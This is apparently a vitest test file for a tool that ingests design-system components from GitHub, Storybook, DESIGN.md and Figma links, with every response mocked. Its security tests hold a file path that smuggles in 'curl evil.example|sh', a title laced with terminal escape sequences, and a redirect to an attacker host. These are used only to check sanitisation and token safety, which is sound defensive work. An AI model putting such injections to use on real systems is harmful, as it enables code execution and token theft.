/**
 * Library ingestion from a link: each reader turns what a source serves into Library items,
 * sorted into roles, with what it could not read said. Responses are recorded here; nothing
 * touches the network.
 */
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, test, vi } from "vitest";
import { LibraryEntry } from "@youiyoux/core";
import { classifyLink, INGEST_CAP, ingestLink, IngestError, nodeFetcher, PoliteClient, type Fetcher } from "../src/index.ts";

const NOW = new Date("2026-10-24T09:00:00.000Z");
const SHA = "a".repeat(40);

/** A fetcher that serves these URLs and records what was asked, with which headers. */
function served(routes: Record<string, unknown>): { fetcher: Fetcher; asked: Array<{ url: string; headers: Record<string, string> }> } {
  const asked: Array<{ url: string; headers: Record<string, string> }> = [];
  const fetcher: Fetcher = async (url, init) => {
    asked.push({ url, headers: init.headers });
    if (!(url in routes)) return new Response("not found", { status: 404 });
    const body = routes[url];
    return new Response(typeof body === "string" ? body : JSON.stringify(body), { status: 200 });
  };
  return { fetcher, asked };
}
const client = (fetcher: Fetcher, extra: { token?: string; figmaToken?: string } = {}) => new PoliteClient({ fetcher, now: () => NOW, ...extra });

const github = (repo: string, files: Record<string, string>, license: unknown = { license: { spdx_id: "MIT" }, html_url: `https://github.com/${repo}/blob/main/LICENSE` }) => ({
  [`https://api.github.com/repos/${repo}`]: { default_branch: "main" },
  [`https://api.github.com/repos/${repo}/commits/main`]: { sha: SHA },
  [`https://api.github.com/repos/${repo}/git/trees/${SHA}?recursive=1`]: { tree: Object.keys(files).map((path) => ({ path, type: "blob", sha: "b".repeat(40) })), truncated: false },
  ...(license ? { [`https://api.github.com/repos/${repo}/license`]: license } : {}),
  ...Object.fromEntries(Object.entries(files).filter(([, body]) => body !== "").map(([path, body]) => [`https://raw.githubusercontent.com/${repo}/${SHA}/${path}`, body])),
});

let dir: string;
beforeAll(async () => {
  dir = await mkdtemp(join(tmpdir(), "youi-ingest-"));
});
afterAll(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe("what a link points at", () => {
  test("GitHub, Figma, a DESIGN.md or a Storybook, from the link's shape", () => {
    expect(classifyLink("github:acme/ui#v2")).toEqual({ kind: "github", owner: "acme", repo: "ui", ref: "v2", path: null });
    expect(classifyLink("https://github.com/acme/ui.git")).toEqual({ kind: "github", owner: "acme", repo: "ui", ref: null, path: null });
    expect(classifyLink("https://github.com/acme/ui/tree/main/packages/react")).toEqual({ kind: "github", owner: "acme", repo: "ui", ref: "main", path: "packages/react" });
    expect(classifyLink("https://github.com/acme/ui/blob/main/DESIGN.md")).toEqual({ kind: "design-md", location: "https://raw.githubusercontent.com/acme/ui/main/DESIGN.md", local: false });
    expect(classifyLink("https://www.figma.com/design/AbC123xyz0/Acme-UI?node-id=1-2")).toEqual({ kind: "figma", key: "AbC123xyz0" });
    expect(classifyLink("https://acme.dev/DESIGN.md")).toEqual({ kind: "design-md", location: "https://acme.dev/DESIGN.md", local: false });
    expect(classifyLink("https://storybook.acme.dev/index.html?path=/docs/button")).toEqual({ kind: "storybook", base: "https://storybook.acme.dev" });
  });

  test("only public https links; a local file only where it is allowed (the CLI)", () => {
    expect(() => classifyLink("http://storybook.acme.dev")).toThrow("is not https");
    expect(() => classifyLink("./DESIGN.md")).toThrow("only the CLI reads those");
    expect(classifyLink("./DESIGN.md", { allowLocal: true })).toMatchObject({ kind: "design-md", local: true });
    expect(() => classifyLink("acme ui")).toThrow(IngestError);
    expect(() => classifyLink("https://www.figma.com/files/team")).toThrow("names no Figma file");
  });
});

describe("a GitHub repository", () => {
  test("a shadcn registry: its components and blocks with their roles, the repo's licence with its evidence, installable from the built item", async () => {
    const registry = { items: [
      { name: "date-picker", type: "registry:ui", title: "Date Picker", description: "Pick a day or a range.", dependencies: ["react-day-picker@9"], files: [{ path: "ui/date-picker.tsx", content: "export function DatePicker() {}" }] },
      { name: "login-01", type: "registry:block", description: "A sign-in form." },
      { name: "theme", type: "registry:style" },
    ] };
    const { fetcher, asked } = served(github("acme/ui", { "registry.json": JSON.stringify(registry), "public/r/date-picker.json": "", "README.md": "" }));
    const result = await ingestLink("https://github.com/acme/ui", { client: client(fetcher), now: () => NOW });
    expect(result.source).toEqual({ kind: "github", name: "acme/ui", url: "https://github.com/acme/ui" });
    expect(result.license).toEqual({ spdx: "MIT", evidenceUrl: "https://github.com/acme/ui/blob/main/LICENSE", verifiedAt: NOW.toISOString() });
    expect(result.entries.map((e) => [e.id, e.kind, e.categories])).toEqual([
      ["lib:acme-ui/component/date-picker", "component", ["date-picker"]],
      ["lib:acme-ui/pattern/login-01", "pattern", []],
    ]);
    const picker = result.entries[0]!;
    expect(picker).toMatchObject({ title: "Date Picker", summary: "Pick a day or a range.", source: { kind: "github", ref: "registry.json#date-picker", url: `https://github.com/acme/ui/blob/${SHA}/registry.json` }, install: { command: `npx shadcn add https://raw.githubusercontent.com/acme/ui/${SHA}/public/r/date-picker.json`, npm: ["react-day-picker"] } });
    expect(result.entries[1]!.install).toBeUndefined();
    expect(result.skipped).toEqual([{ name: "theme", reason: "registry:style: not a component or block" }]);
    expect(result.notes).toContain(`read at ${SHA.slice(0, 7)} (main)`);
    for (const entry of result.entries) expect(LibraryEntry.safeParse(entry).success).toBe(true);
    // Four API calls and one raw file: well inside the 60 an hour GitHub allows without a token.
    expect(asked.filter((a) => a.url.startsWith("https://api.github.com/")).length).toBe(4);
  });

  test("a youiyoux design repo: one item per contract; a licence GitHub cannot name is unknown, and says why", async () => {
    const contract = (name: string) => JSON.stringify({ name, summary: `${name} for every action.`, status: "stable" });
    const { fetcher } = served(github("acme/design", { "youi.config.json": "{}", "components/button/button.contract.json": contract("Button"), "components/card/card.contract.json": contract("Card") }, { license: { spdx_id: "NOASSERTION" }, html_url: "https://github.com/acme/design/blob/main/LICENSE" }));
    const result = await ingestLink("github:acme/design", { client: client(fetcher), now: () => NOW });
    expect(result.license).toBe("unknown");
    expect(result.notes.some((n) => n.startsWith("licence unknown: GitHub names none"))).toBe(true);
    expect(result.entries.map((e) => [e.name, e.summary, e.categories])).toEqual([["Button", "Button for every action.", ["button", "contract", "stable"]], ["Card", "Card for every action.", ["card", "contract", "stable"]]]);
  });

  test("otherwise its component files by name, never tests, stories or helpers; a repo with none says so", async () => {
    const files = { "src/components/AlertDialog.tsx": "", "src/components/ComboBox.tsx": "", "src/components/date-picker.vue": "", "src/components/Button.test.tsx": "", "src/components/Button.stories.tsx": "", "src/components/index.ts": "", "src/components/utils.ts": "", "src/app.tsx": "" };
    const { fetcher } = served(github("acme/app", files, null));
    const result = await ingestLink("github:acme/app", { client: client(fetcher), now: () => NOW });
    expect(result.entries.map((e) => [e.name, e.source.ref, e.categories])).toEqual([["Alert Dialog", "src/components/AlertDialog.tsx", ["dialog"]], ["Combo Box", "src/components/ComboBox.tsx", ["combobox"]], ["Date Picker", "src/components/date-picker.vue", ["date-picker"]]]);
    expect(result.license).toBe("unknown");
    const empty = served(github("acme/empty", { "README.md": "" }));
    await expect(ingestLink("github:acme/empty", { client: client(empty.fetcher) })).rejects.toThrow("has no registry.json, no youi.config.json and no components folder");
  });

  test("a repository GitHub does not show is an error with its reason, not an empty Library", async () => {
    const { fetcher } = served({});
    await expect(ingestLink("github:acme/private", { client: client(fetcher) })).rejects.toThrow("could not read the repository acme/private (https://api.github.com/repos/acme/private): not found");
  });
});

describe("a Storybook", () => {
  test("one item per component title, with its stories, linked to its docs; Pages are patterns; stories.json for an older Storybook", async () => {
    const index = { v: 5, entries: {
      "forms-button--docs": { id: "forms-button--docs", title: "Components/Forms/Button", name: "Docs", type: "docs" },
      "forms-button--primary": { id: "forms-button--primary", title: "Components/Forms/Button", name: "Primary", type: "story" },
      "forms-button--ghost": { id: "forms-button--ghost", title: "Components/Forms/Button", name: "Ghost", type: "story" },
      "pages-checkout--default": { id: "pages-checkout--default", title: "Pages/Checkout", name: "Default", type: "story" },
    } };
    const { fetcher } = served({ "https://storybook.acme.dev/index.json": index });
    const result = await ingestLink("https://storybook.acme.dev/", { client: client(fetcher), now: () => NOW });
    expect(result.source).toEqual({ kind: "storybook", name: "storybook.acme.dev", url: "https://storybook.acme.dev" });
    expect(result.entries.map((e) => [e.name, e.kind, e.source.url, e.categories])).toEqual([
      ["Button", "component", "https://storybook.acme.dev/?path=/docs/forms-button--docs", ["button", "components", "forms"]],
      ["Checkout", "pattern", "https://storybook.acme.dev/?path=/story/pages-checkout--default", ["pages"]],
    ]);
    expect(result.entries[0]!.summary).toBe("Components/Forms/Button in storybook.acme.dev's Storybook, 2 stories: Primary, Ghost");
    expect(result.license).toBe("unknown");

    const old = served({ "https://old.acme.dev/sb/stories.json": { v: 3, stories: { "card--plain": { id: "card--plain", kind: "Card", name: "Plain" } } } });
    expect((await ingestLink("https://old.acme.dev/sb", { client: client(old.fetcher) })).entries.map((e) => e.name)).toEqual(["Card"]);
    await expect(ingestLink("https://acme.dev", { client: client(served({}).fetcher) })).rejects.toThrow("serves no Storybook index");
  });
});

describe("a DESIGN.md", () => {
  const designMd = [
    "---",
    "name: Acme",
    "colors:",
    "  primary: '#5e6ad2'",
    "  surface: '#ffffff'",
    "typography:",
    "  label: { fontSize: 14px, lineHeight: 1.4, fontWeight: 600 }",
    "rounded:",
    "  card: 12px",
    "components:",
    "  button: { backgroundColor: '{colors.primary}' }",
    "  button-hover: { backgroundColor: '{colors.primary}' }",
    "---",
    "",
    "# Design System: Acme",
    "",
    "## Components (contracts)",
    "",
    "| Component | Import | Values | Use |",
    "| --- | --- | --- | --- |",
    "| Button | `import { Button }` | default | Every action a person can take. |",
    "| Dialog | `import { Dialog }` | — | One question at a time. |",
    "",
    "## Rules",
    "",
    "| Rule | Severity |",
    "| --- | --- |",
    "| No raw colour | error |",
  ].join("\n");

  test("a token item per group, a component item per component (a variant folded into its base), from the frontmatter and the body", async () => {
    const { fetcher } = served({ "https://acme.dev/DESIGN.md": designMd });
    const result = await ingestLink("https://acme.dev/DESIGN.md", { client: client(fetcher), now: () => NOW });
    expect(result.source).toEqual({ kind: "design-md", name: "Acme", url: "https://acme.dev/DESIGN.md" });
    expect(result.entries.map((e) => [e.kind, e.name, e.summary])).toEqual([
      ["token", "Colors", "2 colors tokens: primary #5e6ad2, surface #ffffff"],
      ["token", "Typography", "1 typography token: label 14px/1.4/600"],
      ["token", "Corner radius", "1 rounded token: card 12px"],
      ["component", "Button", "Every action a person can take."],
      ["component", "Dialog", "One question at a time."],
    ]);
    // The Rules table is not components.
    expect(result.entries.some((e) => e.name === "No raw colour")).toBe(false);
  });

  test("a local file, read only where allowed, keeps its path out of every item", async () => {
    const file = join(dir, "DESIGN.md");
    await writeFile(file, designMd);
    const result = await ingestLink(file, { client: client(served({}).fetcher), now: () => NOW, allowLocal: true });
    expect(result.entries.length).toBe(5);
    expect(JSON.stringify(result.entries)).not.toContain(dir);
    expect(result.entries[0]!.source).toEqual({ name: "Acme", ingestedAt: NOW.toISOString(), kind: "design-md", ref: "DESIGN.md#colors" });
    await expect(ingestLink(file, { client: client(served({}).fetcher) })).rejects.toThrow("only the CLI reads those");
  });
});

describe("a Figma file", () => {
  const key = "AbC123xyz0";
  const routes = {
    [`https://api.figma.com/v1/files/${key}?depth=1`]: { name: "Acme UI" },
    [`https://api.figma.com/v1/files/${key}/component_sets`]: { meta: { component_sets: [{ key: "set1", node_id: "1:2", name: "Button", description: "Every action.", containing_frame: { pageName: "Controls" } }] } },
    [`https://api.figma.com/v1/files/${key}/components`]: { meta: { components: [{ key: "c1", node_id: "1:3", name: "Size=Small", containing_frame: { containingComponentSet: { name: "Button" } } }, { key: "c2", node_id: "4:5", name: "Avatar", containing_frame: { pageName: "People" } }] } },
    [`https://api.figma.com/v1/files/${key}/styles`]: { meta: { styles: [{ key: "s1", node_id: "9:1", name: "Primary", style_type: "FILL" }, { key: "s2", node_id: "9:2", name: "Body", style_type: "TEXT" }] } },
  };

  test("needs FIGMA_TOKEN, sent to api.figma.com only; a component set is one item, its variants are not; styles by kind", async () => {
    const { fetcher, asked } = served(routes);
    await expect(ingestLink(`https://www.figma.com/design/${key}/Acme-UI`, { client: client(fetcher) })).rejects.toThrow("set FIGMA_TOKEN");
    expect(asked).toEqual([]);
    const result = await ingestLink(`https://www.figma.com/design/${key}/Acme-UI`, { client: client(fetcher, { figmaToken: "figd_secret" }), figma: true, now: () => NOW });
    expect(result.entries.map((e) => [e.kind, e.name, e.source.url])).toEqual([
      ["component", "Button", `https://www.figma.com/design/${key}?node-id=1-2`],
      ["component", "Avatar", `https://www.figma.com/design/${key}?node-id=4-5`],
      ["token", "Color styles", `https://www.figma.com/design/${key}`],
      ["token", "Text styles", `https://www.figma.com/design/${key}`],
    ]);
    expect(result.source.name).toBe("Acme UI (Figma)");
    expect(asked.every((a) => a.headers["x-figma-token"] === "figd_secret")).toBe(true);
    // The token goes nowhere else.
    const elsewhere = served({ "https://storybook.acme.dev/index.json": { entries: {} } });
    await ingestLink("https://storybook.acme.dev", { client: client(elsewhere.fetcher, { figmaToken: "figd_secret" }) }).catch(() => null);
    expect(elsewhere.asked.some((a) => "x-figma-token" in a.headers)).toBe(false);
  });

  test("a file with nothing published says how to publish it", async () => {
    const { fetcher } = served({ ...routes, [`https://api.figma.com/v1/files/${key}/component_sets`]: { meta: { component_sets: [] } }, [`https://api.figma.com/v1/files/${key}/components`]: { meta: { components: [] } }, [`https://api.figma.com/v1/files/${key}/styles`]: { meta: { styles: [] } } });
    await expect(ingestLink(`https://www.figma.com/file/${key}/x`, { client: client(fetcher, { figmaToken: "t" }), figma: true })).rejects.toThrow("publish the library");
  });
});

test(`at most ${INGEST_CAP} items from one link, and the rest counted`, async () => {
  const files = Object.fromEntries(Array.from({ length: INGEST_CAP + 5 }, (_, i) => [`components/Thing${i}.tsx`, ""]));
  const result = await ingestLink("github:acme/big", { client: client(served(github("acme/big", files)).fetcher), now: () => NOW });
  expect(result.entries.length).toBe(INGEST_CAP);
  expect(result.notes.at(-1)).toBe(`5 more items not read: at most ${INGEST_CAP} come from one link`);
});

describe("what a source serves is never trusted", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  test("terminal controls in a name, title or path are removed before anything shows them", async () => {
    const index = { v: 5, entries: { "b--x": { id: "b--x", title: "Components/\x1b]8;;https://evil.example\x07But\x1b[31mton", name: "Primary\x07", type: "story" } } };
    const result = await ingestLink("https://storybook.acme.dev", { client: client(served({ "https://storybook.acme.dev/index.json": index }).fetcher), now: () => NOW });
    expect(result.entries.map((e) => [e.name, e.title, e.summary])).toEqual([["Button", "Components/Button", "Components/Button in storybook.acme.dev's Storybook, 1 story: Primary"]]);
    expect(JSON.stringify(result)).not.toMatch(/[\u0000-\u0008\u001b\u007f]/);
  });

  test("an install command is offered only for a built item at a path of plain characters", async () => {
    const registry = { items: [{ name: "date-picker", type: "registry:ui" }] };
    const files = { "registry.json": JSON.stringify(registry), "x;curl evil.example|sh/public/r/date-picker.json": "" };
    const result = await ingestLink("github:acme/ui", { client: client(served(github("acme/ui", files)).fetcher), now: () => NOW });
    expect(result.entries[0]!.install).toBeUndefined();
  });

  test("neither token follows a redirect to another origin; a redirect within one keeps them", async () => {
    const asked: Array<{ url: string; headers: Record<string, string> }> = [];
    vi.stubGlobal("fetch", async (url: string, init: { headers: Record<string, string> }) => {
      asked.push({ url, headers: { ...init.headers } });
      if (url === "https://api.figma.com/v1/away") return new Response(null, { status: 302, headers: { location: "https://evil.example.com/catch" } });
      if (url === "https://api.figma.com/v1/near") return new Response(null, { status: 302, headers: { location: "/v1/there" } });
      return new Response("{}", { status: 200 });
    });
    const signal = new AbortController().signal;
    await nodeFetcher("https://api.figma.com/v1/away", { headers: { "x-figma-token": "figd_secret", authorization: "Bearer ghp_secret" }, signal });
    expect(asked[1]).toEqual({ url: "https://evil.example.com/catch", headers: {} });
    await nodeFetcher("https://api.figma.com/v1/near", { headers: { "x-figma-token": "figd_secret" }, signal });
    expect(asked[3]).toEqual({ url: "https://api.figma.com/v1/there", headers: { "x-figma-token": "figd_secret" } });
  });
});
